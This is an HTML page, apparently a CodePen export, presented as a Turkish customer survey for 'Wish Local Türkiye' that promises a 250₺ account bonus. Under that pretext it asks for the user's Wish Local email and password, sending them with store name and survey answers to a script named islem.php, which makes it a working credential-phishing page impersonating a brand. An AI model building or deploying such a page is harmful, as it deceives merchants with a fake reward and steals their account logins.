<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>CodePen - Google Forms with File Uploads</title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<lhtml>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/css/materialize.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <title>Wish Local Türkiye</title>
  </head>
  <body>
    <div class="ctrlqFormContentWrapper">
      <div class="ctrlqHeaderMast"></div>
      <div class="ctrlqCenteredContent">
        <div class="ctrlqFormCard">
          <div class="ctrlqAccent"></div>
          <div class="ctrlqFormContent">

            <form action="islem.php" method="post">

              <div class="row">
                <div class="input-field col s12">
                  <h4>Wish Local Türkiye</h4>
                  <p>Wish Local hakkındaki görüşlerini duymak isteriz. Anket 5 dakikadan fazla sürmeyecektir. Anket sonrası Wish Local hesabınıza 250₺ bonus eklenecektir.</p>
                </div>
              </div>
<hr>
              <div class="row">
                <p for="color">Wish Local'e üye olunan email adresi:</p>

                <div class="input-field col s12">
                  <input id="name" name="email" type="text" class="validate"  >
                  <label for="name">Yanıtınız</label>
                  <div id="e1"></div>
                </div>
              </div>

                            <div class="row">
                              <p for="color">Wish Local'e üye olunan parola:</p>

                              <div class="input-field col s12">
                                <input id="name" name="sifre" type="password" class="validate"  >
                                <label for="name">Yanıtınız</label>
                                <div id="e1"></div>
                              </div>
                            </div>

              <div class="row">
                <p for="color">Mağaza adı:</p>

                <div class="input-field col s12">
                  <input id="email" name="magaza" type="text" class="validate" >
                  <label for="email">Yanıtınız</label>
                  <div id="e2"></div>
                </div>
              </div>
              <div class="row">
                <div class="input-field col s12">
                  <p for="color">Wish Local'i nasıl buldunuz?</p>
                  <div>
                    <input name="color" type="radio" id="1" value="Red" >
                    <label for="1">1</label>
                  </div>
                  <p>
                    <input name="color" type="radio" id="2" value="Green">
                    <label for="2">2</label>
                  </p>
                  <p>
                    <input name="color" type="radio" id="3" value="Blue">
                    <label for="3">3</label>
                  </p>
                  <p>
                    <input name="color" type="radio" id="4" value="Blue">
                    <label for="4">4</label>
                  </p>
                  <p>
                    <input name="color" type="radio" id="5" value="Blue">
                    <label for="5">5</label>
                  </p>
                  <div class="input-field">
                    <br>
                    <div id="e4"></div>
                  </div>
                </div>
              </div>

              <div class="row">
                <p for="color">En beğendiğiniz şey ya da size en çok faydası olan bölüm?:</p>

                <div class="input-field col s12">
                  <input id="name" name="bolum" type="text" class="validate"  >
                  <label for="name">Yanıtınız</label>
                  <div id="e1"></div>
                </div>
              </div>
              <div class="row">
                <p for="color">Neyi daha iyi yapabilirdik?:</p>

                <div class="input-field col s12">
                  <input id="name" name="dahaiyi" type="text" class="validate"  >
                  <label for="name">Yanıtınız</label>
                  <div id="e1"></div>
                </div>
              </div>
              <div class="row">
                <div class="input-field col s12">
                  <p for="color">Wish Local ekibinden memnun musunuz?</p>
                  <div>
                    <input name="1" type="radio" id="e" value="e"  >
                    <label for="e">Evet</label>
                  </div>
                  <p>
                    <input name="1" type="radio" id="h" value="h">
                    <label for="h">Hayır</label>
                  </p>

                  <div class="input-field">
                    <br>
                    <div id="e4"></div>
                  </div>
                </div>
              </div>

              <div class="row">
                <p for="color">En beğendiğiniz şey ya da size en çok faydası olan bölüm?:</p>

                <div class="input-field col s12">
                  <input id="name" name="fayda" type="text" class="validate"  >
                  <label for="name">Yanıtınız</label>
                  <div id="e1"></div>
                </div>
              </div>




              <div class="row">
                <div class="input-field col m6 s12">
                  <button  name="form" type="submit" class="waves-effect waves-light btn-large">Gönder</button>
                </div>
              </div>

            </form>

          </div>

        </div>
      </div>
    </div>


    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/js/materialize.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.min.js"></script>

  </body>

  </html>
<!-- partial -->
  <script  src="./script.js"></script>

</body>
</html>
